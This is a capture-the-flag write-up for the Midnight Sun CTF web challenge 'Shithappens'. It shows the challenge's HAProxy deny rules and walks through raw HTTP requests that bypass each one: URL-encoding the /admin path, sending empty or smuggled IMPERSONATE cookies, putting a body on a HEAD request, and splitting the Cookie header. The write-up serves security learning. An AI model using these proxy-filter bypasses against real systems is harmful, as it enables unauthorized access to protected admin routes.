# Shithappens-web

## Description

Sometimes you're just stuck in the middle

settings Service: http://shithappens-01.play.midnightsunctf.se/

Front page:
```

Hello. Get access to /admin. Use the form below to claim a ticket to access it: 

<form action="/admin" method="POST" enctype="multipart/form-data">
	<input type="text" name="username" placeholder="admin">
	<input type="submit">
</form>

Proxy config:

global
  daemon
  log 127.0.0.1 local0 debug

defaults
  log               global
  retries           3
  maxconn           2000
  timeout connect   5s
  timeout client    50s
  timeout server    50s

resolvers docker_resolver
  nameserver dns 127.0.0.11:53

frontend internal_access
  bind 127.0.0.1:8080
  mode http
  use_backend test

frontend internet_access
  bind *:80
  errorfile 403 /etc/haproxy/errorfiles/403custom.http
  http-response set-header Server Server
  http-request deny if METH_POST
  http-request deny if { path_beg /admin }
  http-request deny if { cook(IMPERSONATE) -m found }
  http-request deny if { hdr_len(Cookie) gt 69 }
  mode http
  use_backend test

backend test
  balance roundrobin
  mode http
  server flaskapp app:8282 resolvers docker_resolver resolve-prefer ipv4
```

## Solution

In this task we have to send a request to the `/admin` page in order to retrieve the flag.

We have four filtering rules that deny requests if:
- `/admin` route
- POST method
- IMPERSONATE Cookie
- Cookie header length more than 69 bytes

The proxy server is HAProxy.

1. Bypass filter of URI with encoding:
```
GET /%61dmin HTTP/1.0
Content-Type: multipart/form-data; boundary=---------------------------21837501272512823229266774817
Content-Length: 180

-----------------------------21837501272512823229266774817
Content-Disposition: form-data; name="username"

admin
-----------------------------21837501272512823229266774817--

```

Result:
```
{"result":"Unauthorized, no IMPERSONATE cookie found."}
```

2. Bypass sending IMPERSONAE cookie

The HAProxy function `cook()` checks if a cookie exists in request. But if it's empty, it will not be found for the proxy.

```
GET /%61dmin HTTP/1.0
Content-Type: multipart/form-data; boundary=---------------------------21837501272512823229266774817
Content-Length: 180
Cookie: IMPERSONATE=

-----------------------------21837501272512823229266774817
Content-Disposition: form-data; name="username"

admin
-----------------------------21837501272512823229266774817--

```

Result:
```
{"result":"Unauthorized, no KEY cookie found."}
```

Now if we send `KEY` and `IMPERSONATE` cookies we will get the following result:
```
{"result":"Unauthorized, your cookies are incorrect!"}
```

To get the right cookies we have to send multipart data, but we can't send POST methods.

3. Bypass POST method

Body could be sent with HEAD method:

```
HEAD /%61dmin HTTP/1.0
Content-Type: multipart/form-data; boundary=---------------------------21837501272512823229266774817
Content-Length: 180

-----------------------------21837501272512823229266774817
Content-Disposition: form-data; name="username"

admin
-----------------------------21837501272512823229266774817--

```

Result:
```
HTTP/1.0 200 OK
Set-Cookie: IMPERSONATE=admin; Path=/
Set-Cookie: KEY=0be40039bcd8286eab237f481641b16e5e3ab442e0bc1135f08c143b22dc1efc; Path=/

```

But if we send it, we will be catched with length filter:

4. Bypass Length filter:

We could split in two headers:

```
GET /%61dmin HTTP/1.1
Host: shithappens-01.play.midnightsunctf.se
Cookie: KEY=0be40039bcd8286eab237f481641b16e5e3ab442e0bc1135f08c143b22dc1efc;
Cookie: ;IMPERSONATE=

```

But we can't send value for IMPERSONATE.

5. IMPERSONATE filtering bypass

For figure out we should bruteforce special characters to pass this param to server and bypass proxy's rules:

The solution was to add one of 3 symbols left: `=`,`%0c`,`%0b` , or one of 2 symbols rights: `%0c`, `%0b1`

```
GET /%61dmin HTTP/1.1
Host: shithappens-01.play.midnightsunctf.se
Cookie: KEY=0be40039bcd8286eab237f481641b16e5e3ab442e0bc1135f08c143b22dc1efc;
Cookie: ;=IMPERSONATE=admin

```

The flag:
```
HTTP/1.1 200 OK
Date: Sun, 05 Apr 2020 11:03:30 GMT
Content-Type: application/json
Content-Length: 40
Server: Server

{"result":"midnight{hap_hap_h00r@y!!}"}
```
